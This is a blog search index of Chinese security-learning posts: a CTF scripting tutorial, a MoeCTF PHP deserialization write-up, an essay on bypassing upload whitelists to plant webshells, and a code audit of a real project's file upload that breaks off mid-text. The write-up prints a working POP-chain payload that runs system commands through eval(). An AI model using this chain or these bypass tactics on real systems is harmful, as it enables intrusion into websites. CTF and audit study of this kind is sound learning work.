<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>写好一个脚本</title>
      <link href="/2024/08/18/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/08/18/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="闲言"><a href="#闲言" class="headerlink" title="闲言"></a>闲言</h1><p>作为一名信息安全学习者，编写脚本能力应该是基础能力之一。或许有很多人不注重编写脚本能力，想着自身常备一些脚本即可，然而这样的思维是非常鼠目寸光的，脚本的存在有其必要性，事实上，是不可替代性。</p><p>闲言少叙，言归正传。</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>如何写好一个脚本呢？一个好的脚本有如下特征：</p><ul><li>脚本效率高</li><li>编写省时力</li><li>分工精而简</li><li>信息反馈足</li></ul><p>下面我们会从<code>MoeCTF2024·Web</code>方向的<strong>勇闯铜人阵</strong>一题讲解一个不错的脚本是如何一步步写出来的。</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目入口：</p><p><img src="/./../images/posts/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/image-20240818164801810.png" alt="image-20240818164801810"></p><p>只给玩家三秒的时间，笔者的手速是做不到的，同样如果只是靠手速解决这道题，那么笔者也觉得索然无味。这题并没有过多地涉及漏洞知识，我们只要了解题目机制再编写脚本即可。</p><p>这就是写脚本的第一个要求：<strong>先明白自己要写什么的一个脚本，有什么需要注意的</strong>。</p><p>我们首先要知道参数：</p><p><img src="/./../images/posts/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/image-20240818165238832.png" alt="image-20240818165238832"></p><p>同时本题有设置<code>Session</code>，这就是我们需要注意的。</p><p>同时，我们猜想如果成功了会发生什么。因为新生赛不会很难，所以笔者猜想成功后会出现<strong>flag</strong>：<code>moectf&#123;</code>，这样我们就有了停止标志。</p><p>让我们理理题目机制，这样有利于我们编写脚本：</p><p>题目会发送五次数字，我们必须爬取数字并返回对应的答案，五次以后会得到flag，我们同样要爬取flag。在这期间，我们要保证Session一直存在，不然会失败。</p><p>既然明白了，那么开始写脚本吧！</p><h1 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>写之前肯定要分析细节，也就是解决问题：</p><ol><li>怎么保存Session</li><li>怎么爬取数字</li><li>怎么构造答案</li><li>怎么编写<code>main.py</code></li></ol><p>第一个问题读者自行看我脚本即可；中间两个问题我们单开两个文件再导入即可，方便调试；最后一个问题才是终点。</p><p>对于大多数比较灵活的脚本，<code>main.py</code>的逻辑是很重要的。当我们不知道<code>main.py</code>具体逻辑如何时，不妨先上手编写，边写边想。</p><h2 id="main-py"><a href="#main-py" class="headerlink" title="main.py"></a>main.py</h2><p>但是本篇是进阶文章，所以就不再赘述基础的脚本编写，笔者直接给出<code>main.py</code>脚本：</p><p><img src="/./../images/posts/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/image-20240818170735215.png" alt="image-20240818170735215"></p><p>细节的读者会发现我第一行代码和发包方式的不同：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session = requests.Session()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = session.post(url, data=data)</span><br></pre></td></tr></table></figure><p>这就可以接受并保存第一个响应包的<code>Set-Cookie: session=balabala</code>，也就是解决了第一个问题。</p><p>通观<code>main.py</code>代码，笔者只采用了一个<code>while</code>循环。事实上，笔者刚开始写<code>main.py</code>时并没有采用循环，连写好几段过程，这样不仅耗时耗力，还容易出错，于是笔者毅然决然选择<strong>while循环</strong>和<strong>函数封装</strong>。其实题目明面上表示第一次发包和后面几次发包的功能是不同的、参数是不同的，但是细心观察发现这两种请求包的原理几乎一模一样，只有<code>POST</code>参数不同而已，该处不同完全可以用灵活的<code>python</code>语法解决：</p><p><img src="/./../images/posts/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/image-20240818172117574.png" alt="image-20240818172117574"></p><p>综上所述，我们目前解决了两个问题：</p><ul><li><p>怎么保存Session</p></li><li><p>怎么编写<code>main.py</code></p></li></ul><p>还剩两个问题：</p><ul><li>怎么爬取数字</li><li>怎么构造答案</li></ul><p>不妨细细思考，这两个问题都依赖于响应包，并且每个阶段的工作原理近乎一致，所以不妨编写一个函数，在响应包下来后利用该函数多次，这样不仅省时省空间，还利于调试，笔者于此还会得到一种美感。</p><h2 id="fun-request-py"><a href="#fun-request-py" class="headerlink" title="fun_request.py"></a>fun_request.py</h2><p>我们在<code>fun_request.py</code>编写函数<code>request()</code></p><p><img src="/./../images/posts/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/image-20240818173043019.png" alt="image-20240818173043019"></p><p>读者可以看到我添加了很多调试语句，这些语句没有直接的作用，但是在脚本出问题时可以快速地、有针对性地解决问题，这何尝不是一种<strong>高效性</strong>的体现呢？</p><p>本函数还利用了另外一个函数，函数层层套用也是方便调试和寻找问题的一个优点！</p><h2 id="fun-solve-py"><a href="#fun-solve-py" class="headerlink" title="fun_solve.py"></a>fun_solve.py</h2><p><img src="/./../images/posts/%E5%86%99%E5%A5%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC/image-20240818173704878.png" alt="image-20240818173704878"></p><p>该函数只接受题目并返回答案，如果有其他错误就不是该函数的问题，这就大大方便了定位错误。</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>三个文件的代码，特别是两个函数，笔者很难自己想出来。但是笔者可以问<code>GPT</code>，这就是写好脚本的一个比较实用的方法：<strong>自己想好逻辑，具体代码可以由人工智能代劳</strong>。当然别全部交给GPT就不管了，自己还是要调试的。</p><p>所以，写好一个脚本有以下一些方法：</p><ul><li>理解工作机制和注意事项</li><li>明确脚本主体逻辑，明确分工和封装</li><li>多加注释和调试语句</li><li>不会的部分可以询问人工智能</li></ul><p>最后，熟能生巧，勇于创新！</p>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024·pop_moe</title>
      <link href="/2024/08/16/MoeCTF2024%C2%B7pop-moe/"/>
      <url>/2024/08/16/MoeCTF2024%C2%B7pop-moe/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>新生赛的一道题，在反序列化里算是比较简单的，有必要拿来专门写博客吗？</p><p>有。其一，这道题能锻炼我的逻辑，写下来更有利于我的思考和逻辑的培养；其二，反思不看重题的难度，更看重自己学到什么。</p><p>本篇文章我会说得比较详细，请读者细细品味，多加思考。</p><hr><h1 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h1><p>题目给了四个类：</p><p><code>class000</code></p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816093949866.png" alt="image-20240816093949866"></p><p><code>class001</code></p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816094035000.png" alt="image-20240816094035000"></p><p><code>class002</code></p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816094104671.png" alt="image-20240816094104671"></p><p><code>class003</code></p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816094131537.png" alt="image-20240816094131537"></p><p>然后是主程序：</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816094223873.png" alt="image-20240816094223873"></p><p>写前须知：</p><ul><li>了解：<code>__invoke()</code>、<code>__set()</code>等魔术方法</li><li>了解<code>PHP</code>反序列化</li></ul><hr><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>我们的目的是什么？我们要想办法得到<code>flag</code>。因为本题没有直接提示<code>flag</code>在哪，所以我们先尝试<code>getshell</code>。我们要怎么实现<code>getshell</code>？<code>getshell</code>的方式有很多，在本题我们看到了一个危险函数<code>eval()</code>和似乎可控的变量，我们需要利用这段程序实现<code>getshell</code>。那怎么利用<code>eval()</code>和似乎可控的变量实现<code>getshell</code>呢，这需要下文的反序列化构造<code>POP</code>链来实现。</p><h2 id="概念和宏析"><a href="#概念和宏析" class="headerlink" title="概念和宏析"></a>概念和宏析</h2><p>先解释一些概念（我自己编的概念，方便逻辑推理）：</p><p><strong>起点&amp;终点</strong></p><ul><li>起点：反序列化实例化对象后自动触发的点为起点，会引发程序按照特意的目的进行，起点一般是某些魔术方法。</li><li>终点：可以直接实现<code>getshell</code>的点。终点一般是危险函数。</li></ul><p><strong>最里层&amp;最外层</strong></p><ul><li><p>对象嵌套：举例说明：A类实例的一个属性是B类实例，B类实例的一个属性是C类实例······，以此类推。</p></li><li><p>最里层：顾名思义，就是对象嵌套里的最里层的那个对象。</p></li><li><p>最外层：对象嵌套里的最外层的那个对象</p></li></ul><p>宏观分析反序列化：</p><p>当我们把序列化的数据交给相关程序时，反序列化函数会生成一个所属类的实例。如果只是一个简单的实例，那么程序就像死水一样毫无动静，但是如果这个实例有魔术方法，当类的实例满足特定的条件时程序就会自动调用这些方法，那么整个程序就动起来了。只有程序动起来才能实现我们的目的。</p><p>我们需要一个起始魔术方法也就是上文所说的<strong>起点</strong>，这个魔术方法所需的条件是必定会满足的，这样程序就可以在反序列化生成实例后自动运行。你能在本题找到符合的魔术方法吗？</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816105153266.png" alt="image-20240816105153266"></p><p>没错，本题的起点就是<code>class000</code>的析构函数<code>__destruct()</code>。起点不一定在最外层对象，但是起着<strong>运行特定程序</strong>的作用，所以写反序列化，我们必须要找到这样一个起点。</p><p>我们同样需要一个终点，在终点我们可以直接实现<code>getshell</code>。这样的终点往往是具有危险函数的点，比如本题的：</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816110350102.png" alt="image-20240816110350102"></p><p>现在我们知道了触发程序的起点（不一定在最外层的对象），和可以<code>getshell</code>的终点（一般在最里层的对象）。</p><h2 id="方法和原则"><a href="#方法和原则" class="headerlink" title="方法和原则"></a>方法和原则</h2><p>反序列化的一般方法即是<strong>从最里层推到最外层</strong>。何为最里层，就是直接拥有危险函数的类的实例。对于本题而言，就是<code>class003</code>。</p><p><code>class003</code>的<code>eval()</code>是危险函数，我们希望<code>$str</code>是可控变量。在反序列化里，<strong>所有属性都是可控变量</strong>。</p><p>要使用<code>eval()</code>需要先使用<code>evvval()</code>，这同样是反序列化的一个重要特征：<strong>所有方法的触发都是有条件的</strong>。</p><p>现在我们理清楚了反序列化程序的两个基本元素：</p><ul><li><strong>所有属性都是可控变量</strong></li><li><strong>所有方法的触发都是有条件的</strong></li></ul><p>那么我们就从最里层<code>class003</code>，依照上述原则一层一层往外推。最后我再补充一点，对于各个方法的参数我们通常不主动关注，随着方法的回推参数自然会一层层回推。</p><h2 id="不断的回推"><a href="#不断的回推" class="headerlink" title="不断的回推"></a>不断的回推</h2><p>我们要使用<code>class003</code>的<code>eval()</code>，那么首先要调用<code>class003</code>的<code>evvval()</code>。哪里可以调用<code>class003</code>的<code>evvval()</code>呢？</p><p>把目光转向<code>class002</code>：</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816094104671.png" alt="image-20240816094104671"></p><p><code>class002</code>的<code>dangerous()</code>方法可以调用<code>evvval()</code>。因为<code>evvval()</code>是<code>class003</code>的方法，所以<code>$shaattt</code>必须是<code>class003</code>的实例。那么现在的问题是：我们该怎么调用<code>class002</code>的<code>dangerous()</code>呢？</p><p>再细看一下<code>dangerous()</code>，这么一个方法是有参数的，通观所有类，只有<code>class002</code>自己的<code>__set()</code>魔术方法可以满足。看看<code>__set()</code> 魔术方法的触发条件：</p><blockquote><p>在给不可访问的(<code>protected</code>或者<code>private</code>)或者不存在的属性赋值的时候，会被调用<code>__set()</code> 魔术方法</p></blockquote><p>上述条件是很广泛的，可以是存在的属性也可以是不存在的属性。我们不妨都找找（寻找的线索就是赋值操作）：</p><p>第一处：</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816114918979.png" alt="image-20240816114918979"></p><p>看起来很怪，$a更像是一个实例或者方法而不是属性。</p><p>第二处：</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816115047251.png" alt="image-20240816115047251"></p><p><code>payload</code>属性是所有类都没有的，符合上面的条件。那么<code>class001</code>的<code>$a</code>应该是<code>class002</code>，<code>class001</code>的<code>$payl0ad</code>应该是字符串<code>dangerous</code>（为什么是字符串，这属于<code>PHP</code>基本功）。要满足上述的赋值操作，需要满足<code>__invoke()</code>魔术方法，看看这个魔术方法的使用条件：</p><blockquote><p>__invoke() 当脚本尝试将对象调用为函数时触发，该对象必须是直接拥有<code>__invoke()</code>魔术方法的对象</p></blockquote><p>这里有个细节，上述的对象必须是直接拥有<code>__invoke()</code>魔术方法的对象，不能是嵌套的外层的对象。</p><p>现在想想该怎么触发<code>__invoke()</code>魔术方法呢？我们刚才找到了这一处：</p><p><img src="/./../images/posts/MoeCTF2024%C2%B7pop-moe/image-20240816114918979.png" alt="image-20240816114918979"></p><p>如果<code>class000</code>的<code>$what</code>是<code>class001</code>，那么<code>class000</code>的<code>$a</code>就是<code>class001</code>？等等，<code>class000</code>好像没有<code>$a</code>这个属性吧？完蛋了吗，好像推不出来了！你会怎么想呢，不妨先<strong>不</strong>往下看，自己想几分钟。</p><p>没错，给<code>class000</code>实例外面再套一层<code>class001</code>实例，那么就相当于<code>class000</code>实例有<code>$a</code>属性了。注意！这里的<code>class001</code>实例和上面提到的需要触发<code>__invoke()</code>魔术方法的<code>class001</code>实例是不同的实例。</p><p>最后再给<code>class000</code>的<code>$payl0ad</code>属性赋个值，别触发<code>die()</code>即可。</p><h2 id="流程和POP"><a href="#流程和POP" class="headerlink" title="流程和POP"></a>流程和POP</h2><p>大概的流程，也就是嵌套关系，可以粗糙表示为：</p><p><code>class003 &lt; class002 &lt; class001 &lt; class000 &lt;class0001</code></p><p>附上<code>POP</code>链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;what = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>=<span class="string">&quot;dangerous&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;sec = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>=<span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line"><span class="variable">$_2</span>-&gt;<span class="title function_ invoke__">aaa</span>(<span class="variable">$_3</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_10</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line"><span class="variable">$_10</span>-&gt;a = <span class="variable">$_2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_0</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class000</span>();</span><br><span class="line"><span class="variable">$_0</span>-&gt;<span class="title function_ invoke__">aaa</span>(<span class="variable">$_10</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line"><span class="variable">$_1</span>-&gt;a = <span class="variable">$_0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_1</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_1</span>));</span><br></pre></td></tr></table></figure><hr><h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>回顾此题时，好像没有那么难。当时因为<code>__invoke()</code>的直系问题使我的思路卡了好久，所幸又认真看了相关的概念解释才得以解决该题目。<strong>所以基础非常重要</strong>，<strong>基础是推理的根据</strong>，就像数学的公理和推论。</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈思维·一</title>
      <link href="/2024/08/14/%E8%B0%88%E8%B0%88%E6%80%9D%E7%BB%B4%C2%B7%E4%B8%80/"/>
      <url>/2024/08/14/%E8%B0%88%E8%B0%88%E6%80%9D%E7%BB%B4%C2%B7%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次主要讲述两种思维，或者说思考的方式。</p><hr><h1 id="如何得到一个漏洞？"><a href="#如何得到一个漏洞？" class="headerlink" title="如何得到一个漏洞？"></a>如何得到一个漏洞？</h1><p><em>如何得到一个漏洞，这是一个非常深邃的问题，目前的我没有实力讲得清楚，但是也想分享一下自己的感悟。</em></p><h2 id="从本质上思考"><a href="#从本质上思考" class="headerlink" title="从本质上思考"></a>从本质上思考</h2><p>漏洞的本质是什么？是程序；程序的本质是什么，是变量和函数按照特定的逻辑运行。与其说我们找到了一个漏洞，不如说我们成功利用了变量、函数甚至是逻辑。</p><p>当我们把漏洞这个抽象的概念落实到客观的物体上面，我们就必须要按照客观、严谨、变化的思维去思考。下面我会以代码审计的视角去分享如何得到一个漏洞。</p><h2 id="漏洞的产生"><a href="#漏洞的产生" class="headerlink" title="漏洞的产生"></a>漏洞的产生</h2><p>漏洞即是程序的破绽，让程序运行破绽可以为漏洞的利用创造条件。</p><p>漏洞的基础是变量、函数和逻辑，所以程序的破绽往往是这三者共同构成的。比如<code>SQL</code>注入，本质上就是程序对输入流的检查不严谨导致输入流可以越过数据流直达控制流，这也恰恰是大多数注入型漏洞的成因，所以这类漏洞所在程序的破绽即是程序对输入流的检查不严谨。</p><p>程序是怎么存在这些破绽的，归根结底是开发者的懒惰和能力有限，然而这并不是黑客应该考虑的，黑客应该考虑的是怎么找到这些漏洞，并利用它们。</p><h2 id="不要套公式！"><a href="#不要套公式！" class="headerlink" title="不要套公式！"></a>不要套公式！</h2><p><em>黑客在乎的是结果，而非某种固定的过程</em></p><p>讲了这么久，终于到正题了。</p><p>我们知道，漏洞的存在需要危险的函数和可控的参数。当我们终于找到符合条件的程序时，或许一个限制就把我们弄得无计可施，这样的感觉真的很糟糕！</p><p>但是这样的思维真的很浅很浅。我们要深刻地记住一点，<strong>一个漏洞往往是多处程序的破绽层层递进，共同构成的</strong>。举个例子，假如你已经找到文件上传相关的危险函数和可控参数，但是程序存在下图的白名单，你会怎么做？</p><p><img src="/./../images/posts/%E8%B0%88%E8%B0%88%E6%80%9D%E7%BB%B4%C2%B7%E4%B8%80/image-20240814172120168.png" alt="image-20240814172120168"></p><p>有些人可能放弃了，因为白名单不允许上传<code>PHP</code>文件，这样我们就不能直接上传<code>PHP</code>木马了。但是这样的逻辑是不可取的，因为我们的最终目的是给网站挂马，而不是“直接上传<code>PHP</code>木马”这个方式，换言之，我们关心的不是某种方式能不能挂马，而是我们的最终目的——网站被挂马。所以我们可以通过各种手段互相配合、层层递进，最终使网站被挂马，放到本题就是利用<code>zip</code>间接挂马。</p><p>综上所述，我们在面对一份程序时，不要被看起来让我们无计可施的限制而吓到，我们或许可以放弃这此处程序（可能就只有这一处程序存在漏洞），但是我们更应该学会如何绕过层层限制——这要求我们凡事多想几步，实现我们的最终目的。</p><p>上图我们拿<code>png</code>、<code>jpg</code>无计可施，但是<code>zip</code>可以成为我们绕过的手段（这就是我们多想的一步），所以我们的攻击递进了一次——<code>PHP</code>文件封装在压缩包里。递进不是目的而是手段，我们唯一的目的就是挂马。</p><p>不要套公式，<strong>面对限制不妨多想几步</strong>，曲折没关系，能达到最终目的就可以。这句话把我的思维彻底转变了：</p><ul><li>原来的我：这个地方符不符合某种漏洞呢？有白名单限制，我用不了，放弃！</li><li>现在的我：这个地方好像可以构造漏洞，虽然有白名单限制，但是我可以看看白名单里的能不能利用，白名单里的<code>zip</code>好像可以利用！</li></ul><p>写这节内容我无非想说的是，现在的项目必然会存在诸如白名单等等的限制，我们不应该见到限制就放弃，而是应该多想想怎么找到限制的漏洞，打个漂亮的配合，实现我们的最终目的。有这样的思想，或许更能得到漏洞吧。</p><hr><h1 id="如何解决问题"><a href="#如何解决问题" class="headerlink" title="如何解决问题"></a>如何解决问题</h1>]]></content>
      
      
      <categories>
          
          <category> 思维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三次代码审计</title>
      <link href="/2024/08/12/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/12/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>审计项目：<a href="https://doc.yfx.top/48rmwowb2q/xuyan.html">🌲 序言 - 源分享 (yfx.top)</a></p><p>运维平台：<code>wsl</code> &#x3D;&gt; <a href="https://www.bt.cn/new/index.html">宝塔面板 - 简单好用的Linux&#x2F;Windows服务器运维管理面板 (bt.cn)</a></p><p>审计提示：<strong>文件上传</strong></p><hr><h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p>在寻找漏洞之前，需要先看看项目的架构：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240812205703740.png" alt="image-20240812205703740"></p><ul><li><code>app</code>目录下是各个应用，每个应用都有很多控制器。</li><li><code>view</code>目录负责视图层，也就是前端页面。</li><li><code>public-&gt;home</code>目录负责网站首页。</li></ul><hr><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h2><blockquote><p>程序的本质是变量与函数，漏洞所依赖的也无法脱离这两个元素。</p></blockquote><p>可控的变量和危险的函数是形成漏洞的必要条件，这两点也衍生了两种截然相反的审计方向：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240812212548976.png" alt="image-20240812212548976"></p><ol><li>通过可控变量找到危险函数</li><li>通过危险函数找到可控变量</li></ol><p>仔细思考，第一种方法其实是不太方便的。因为可控变量非常多，利用点也不少，但不是所有可控变量都可以到达危险函数；另外，正向探索变量的生命周期和作用点是有难度的。</p><p>而第二种方法比较方便。我们首先找到<strong>危险函数</strong>（可以利用全局搜索和相关工具），再对危险函数的参数进行追溯，这其中追溯变量的过程是很方便的。</p><p>鉴于第一种方法的风险和第二种方法的便利，我们往往采用<strong>第二种方法</strong>开始审计。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>本次审计的提示是<strong>文件上传</strong>。我们首先要全局搜索与<strong>文件上传</strong>相关的<strong>危险方法</strong>，并且希望这些方法在控制器中，再不济也要在模型层中——模型层会被控制层调用。</p><p>那我先尝试：<code>upload</code></p><h3 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h3><p><strong>入口</strong></p><p>我首先关注这段代码：<code>.../app/admin/controller/index.php-&gt;upload()</code></p><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240813110118559.png" alt="image-20240813110118559"></p><blockquote><p>我们不能因为这段代码在<code>admin</code>应用中而不尝试审计和利用，因为在实战中我们可以通过爆破和提权等手段到达后台，此后还是需要审计代码寻找漏洞来实现<code>getshell</code>。</p></blockquote><p><strong>条件</strong></p><p>我们先分析两点：</p><ol><li>可不可以访问（利用）这个方法？（假设我们已经是管理员）</li><li>有没有可控的变量？</li></ol><ul><li>对于第一点，这段代码写在控制器中，身为管理员的我们是可以直接访问的。</li><li>对于第二点，<code>putFile()</code>方法的两个参数都是可控的。</li></ul><p>但是文件上传漏洞还要再弄清楚几点：</p><ol><li>相关方法的<code>waf</code>是否可以绕过</li><li>文件最终存放的路径是如何构造的</li><li>我们以什么形式访问上传的文件</li></ol><p><strong>解析</strong></p><ol><li>我们先看最外层的<code>getJson()</code>方法：</li></ol><p><img src="/./../images/posts/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240813111503344.png" alt="image-20240813111503344"></p><p>生成的json格式：已下采用默认值</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;操作成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span 